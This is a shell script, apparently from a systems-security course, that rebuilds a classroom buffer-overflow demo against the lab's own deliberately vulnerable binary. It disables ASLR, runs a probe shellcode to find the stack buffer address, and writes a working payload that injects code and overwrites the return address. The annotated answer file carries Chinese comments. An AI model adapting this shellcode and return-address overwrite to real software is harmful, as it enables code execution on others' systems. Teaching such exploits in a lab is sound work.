#!/bin/sh
# Rebuild the attack1 classroom demo:
#   examples/attack1      the build of the demo student number 000000000001
#   examples/attack1.txt  its answer: the 27-byte code at the low end of the
#                         buffer, then 41s, then the return address pointing at
#                         that code (320 bytes, nothing above the return address)
#   examples/attack1.bin  the answer's raw bytes, written by the lab's tools/unhex
#   examples/q4_0.gguf    a link to the nano-quant model
#
# The pages' attack carries the code inside the buffer, so it needs the buffer's
# address; that address moves on every run while ASLR is on. The script measures
# it under `setarch -R` (ASLR off, the address fixed) with a probe payload: 312
# bytes of 41, the push %rsp; ret the lab's reference answer uses as the return
# address -- the lecture itself never shows it -- and a code of its own that
# prints %rsp - 0x140, which is the buffer (%rsp is %rbp+16 at the code's entry,
# the buffer is %rbp-0x130). The answer it then writes is the lecture's form:
# the reference answer's 27-byte code moved to the low end of the buffer, 41s up
# to and including the saved %rbp, and the return address set to the measured
# address. The probe and the answer run the same way, so the address holds, and
# the script checks that the answer prints "phase 1 passed".
#
# The reference answers in the lab's dist/answers/ are backed up and restored on
# the way out, and the lab is left as the reference build, so nothing but the
# lecture's examples/ changes. Run it from anywhere.
set -eu
here=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
lecture=$(dirname -- "$here")
lab=$lecture/../attack-elf
id=000000000001                     # the same demo number the bomb-lab pages use
ref=026033910166

work=$(mktemp -d)
mkdir "$work"/backup
cp "$lab"/dist/answers/*.txt "$work"/backup/
trap 'cp "$work"/backup/*.txt "$lab"/dist/answers/; rm -rf "$work"' EXIT

cd "$lab"
make -s attack ID=$id
python3 tools/gen_exploits.py $id >/dev/null
cp attack1 "$lecture"/examples/attack1
cp dist/answers/attack1.txt "$work"/reference.txt
tools/unhex < "$work"/reference.txt > "$work"/reference.bin

cd "$lecture"/examples
ln -sfn ../../nano-quant/model/q4_0.gguf q4_0.gguf

python3 - "$work" <<'PY'
import pathlib, sys

work = pathlib.Path(sys.argv[1])
ref = (work / "reference.bin").read_bytes()
gadget, code = ref[312:320], ref[320:347]
if code[:5] != bytes.fromhex("bf 01 00 00 00") or code[25:] != bytes.fromhex("ff d0"):
    sys.exit("the reference answer is not the shape this script knows")
# jumps into its own code through the gadget (the stack address is not known
# yet) and prints the buffer address, then exits: write(1, &value, 8)
probe = bytes.fromhex(
    "48 8d 84 24 c0 fe ff ff"       # lea -0x140(%rsp),%rax
    "50"                            # push %rax
    "48 89 e6"                      # mov %rsp,%rsi
    "bf 01 00 00 00"                # mov $1,%edi
    "ba 08 00 00 00"                # mov $8,%edx
    "b8 01 00 00 00"                # mov $1,%eax
    "0f 05"                         # syscall: write
    "b8 3c 00 00 00"                # mov $60,%eax
    "31 ff"                         # xor %edi,%edi
    "0f 05")                        # syscall: exit
(work / "probe.bin").write_bytes(b"\x41" * 312 + gadget + probe)
PY

setarch -R ./attack1 -q < "$work"/probe.bin > "$work"/probe.out

python3 - "$work" <<'PY'
import pathlib, sys

work = pathlib.Path(sys.argv[1])
raw = (work / "probe.out").read_bytes()
addr = int.from_bytes(raw[-8:], "little")
if len(raw) < 8 or not 0x700000000000 <= addr < 0x800000000000:
    sys.exit("the probe printed no stack address: %r" % raw[-16:])
code = (work / "reference.bin").read_bytes()[320:347]
payload = code + b"\x41" * (304 - len(code)) + b"\x41" * 8 + addr.to_bytes(8, "little")
if len(payload) != 320 or b"\x0a" in payload:
    sys.exit("refusing to write a %d-byte payload" % len(payload))
(work / "attack1.bin").write_bytes(payload)

# the answer file, in the shape answers/attack1.txt has: hex bytes, 16 per
# line, a comment after #
lines = ["# 演示学号 000000000001 的阶段 1 攻击：代码写在缓冲区的低端，返回地址改写为它的地址，ret 直接落到这段代码上",
         "# 缓冲区 %rbp-0x130（304 字节），保存的 %rbp 占 8 字节，返回地址在 %rbp+8：代码之后到返回地址共 312 字节"]
key = int.from_bytes(payload[7:15], "little")
gate = int.from_bytes(payload[17:25], "little")
lines += [
    "bf 01 00 00 00                                        # 代码：mov $1,%edi —— 第一个参数，阶段号",
    "48 be 0b 23 7d 5c be fb d6 27                         # movabs $0x%016x,%%rsi —— 第二个参数，口令" % key,
    "48 b8 00 80 52 01 00 00 00 00                         # movabs $0x%08x,%%rax —— &report_pass" % gate,
    "ff d0                                                 # call *%rax —— 两个参数就位，进入过关函数；代码共 27 字节",
]
for off in range(len(code), 304, 16):
    n = min(16, 304 - off)
    hexs = " ".join("%02x" % b for b in payload[off:off + n])
    lines.append("%-53s # 填充，第 %d..%d 字节" % (hexs, off + 1, off + n))
lines.append("%-53s # 填充，第 305..312 字节（保存的 %%rbp）"
             % " ".join("%02x" % b for b in payload[304:312]))
lines.append("%-53s # 覆盖后的返回地址 = 0x%016x = 缓冲区里代码的地址（演示环境关掉 ASLR，"
             "由 tools/make-attack-demo.sh 的探针量出）" % (" ".join("%02x" % b for b in payload[312:]), addr))
(work / "attack1.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
(work / "addr.txt").write_text("0x%016x" % addr)
PY

cp "$work"/attack1.txt attack1.txt
cp "$work"/attack1.bin attack1.bin

out=$(setarch -R ./attack1 -q < attack1.bin)
case $out in
    *"phase 1 passed"*) ;;
    *) echo "the answer did not pass -- $out" >&2; exit 1 ;;
esac

cd "$lab"
make -s attack ID=$ref              # the lab keeps the reference build
echo "examples/attack1: $(wc -c < "$lecture"/examples/attack1.bin) bytes, ret = $(cat "$work"/addr.txt), phase 1 passed"
